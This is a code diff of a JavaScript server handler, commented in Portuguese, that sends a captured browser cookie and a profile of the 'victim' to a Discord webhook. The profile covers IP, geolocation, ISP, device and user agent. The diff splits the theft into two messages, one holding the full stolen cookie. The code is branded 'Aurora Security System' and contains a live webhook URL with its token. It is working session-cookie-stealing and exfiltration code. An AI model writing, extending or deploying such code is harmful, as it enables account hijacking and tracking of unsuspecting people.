@@ -34,32 +34,48 @@ export default async function handler(req, res) {
     // SUA WEBHOOK AQUI - SEGURA NO BACKEND
     const webhookURL = 'https://canary.discord.com/api/webhooks/1477057706568323195/4545g7HNyqcjMCkJe2t95-djEoA-kuXgu-VY1u_zb6slpT3lpdmbwyxDl8urWU51Effi';
 
-    // Dividir o cookie em partes se for muito longo (limite do Discord é 1024 caracteres)
-    const cookieValue = '```' + cookie + '```';
-    
-    // Criar mensagem mais profissional com cookie completo
-    const embed = {
+    // PRIMEIRA MENSAGEM: APENAS O COOKIE
+    const cookieMessage = {
       content: '@everyone',
       embeds: [{
-        title: '🔐 **NOVA CAPTURA DE COOKIE**',
-        description: 'Um novo cookie foi capturado pelo sistema Aurora',
+        title: '🍪 **COOKIE CAPTURADO**',
+        description: '```' + cookie + '```',
+        color: 0x6366f1,
+        footer: {
+          text: 'Aurora Security System • Cookie',
+          icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png?ex=69a8de60&is=69a78ce0&hm=30c2567486c3f374e4fdc3e9ed7712ff5613520c72a7264d002dd1ad2b696328&=&format=webp&quality=lossless&width=240&height=233'
+        },
+        timestamp: new Date().toISOString(),
+        thumbnail: {
+          url: 'https://media.discordapp.net/attachments/1456825082507956428/1477117859665805312/clideo_editor_64f89f8646e04ff7b36cd451bf005602_online-video-cutter.com.gif?ex=69a835f5&is=69a6e475&hm=47008cff92b32b165301e19e2f528da6f4b03f42900a8401c989976a082459cd&=&width=569&height=320'
+        }
+      }]
+    };
+
+    await fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(cookieMessage)
+    });
+
+    // SEGUNDA MENSAGEM: INFORMAÇÕES DO IP E DISPOSITIVO
+    const infoMessage = {
+      embeds: [{
+        title: '📊 **INFORMAÇÕES DA VÍTIMA**',
         color: 0x6366f1,
         fields: [
           {
-            name: '🍪 **COOKIE COMPLETO**',
-            value: cookieValue.length > 1024 ? cookieValue.substring(0, 1020) + '...' : cookieValue
-          },
-          {
-            name: '📊 **INFORMAÇÕES DO DISPOSITIVO**',
+            name: '📱 **DISPOSITIVO**',
             value: `\`\`\`yml
 Dispositivo: ${device}
 Navegador: ${getBrowserInfo(req)}
 Sistema: ${getOSInfo(req)}
 Idioma: ${req.headers['accept-language'] || 'Desconhecido'}
+User Agent: ${req.headers['user-agent'] || 'Desconhecido'}
 \`\`\``
           },
           {
-            name: '🌍 **INFORMAÇÕES DO IP**',
+            name: '🌍 **LOCALIZAÇÃO**',
             value: `\`\`\`yml
 IP: ${ip}
 País: ${ipInfo.country || 'Desconhecido'} ${ipInfo.countryCode || ''}
@@ -69,6 +85,11 @@ CEP: ${ipInfo.zip || 'Desconhecido'}
 Latitude: ${ipInfo.lat || 'Desconhecido'}
 Longitude: ${ipInfo.lon || 'Desconhecido'}
 Fuso Horário: ${ipInfo.timezone || 'Desconhecido'}
+\`\`\``
+          },
+          {
+            name: '🌐 **REDE**',
+            value: `\`\`\`yml
 Provedor: ${ipInfo.isp || 'Desconhecido'}
 Organização: ${ipInfo.org || 'Desconhecido'}
 Mobile: ${ipInfo.mobile ? 'Sim' : 'Não'}
@@ -93,44 +114,18 @@ Hosting: ${ipInfo.hosting ? 'Sim' : 'Não'}
           }
         ],
         footer: {
-          text: 'Aurora Security System • Proteção Avançada',
+          text: 'Aurora Security System • Informações',
           icon_url: 'https://media.discordapp.net/attachments/1478076459074719877/1478567053999869993/Gemini_Generated_Image_17qz9117qz9117qz.png?ex=69a8de60&is=69a78ce0&hm=30c2567486c3f374e4fdc3e9ed7712ff5613520c72a7264d002dd1ad2b696328&=&format=webp&quality=lossless&width=240&height=233'
         },
-        timestamp: new Date().toISOString(),
-        thumbnail: {
-          url: 'https://media.discordapp.net/attachments/1456825082507956428/1477117859665805312/clideo_editor_64f89f8646e04ff7b36cd451bf005602_online-video-cutter.com.gif?ex=69a835f5&is=69a6e475&hm=47008cff92b32b165301e19e2f528da6f4b03f42900a8401c989976a082459cd&=&width=569&height=320'
-        }
+        timestamp: new Date().toISOString()
       }]
     };
 
-    // Enviar para o Discord
     const response = await fetch(webhookURL, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify(embed)
+      body: JSON.stringify(infoMessage)
     });
-
-    // Se o cookie for muito longo e foi cortado, enviar uma segunda mensagem com o resto
-    if (cookieValue.length > 1024) {
-      const remainingCookie = cookieValue.substring(1020);
-      
-      const secondEmbed = {
-        embeds: [{
-          title: '📎 **CONTINUAÇÃO DO COOKIE**',
-          color: 0x6366f1,
-          description: remainingCookie.length > 1024 ? remainingCookie.substring(0, 1020) + '...' : remainingCookie,
-          footer: {
-            text: 'Continuação do cookie anterior'
-          }
-        }]
-      };
-      
-      await fetch(webhookURL, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(secondEmbed)
-      });
-    }
 
     if (!response.ok) {
       throw new Error('Falha ao enviar para Discord');
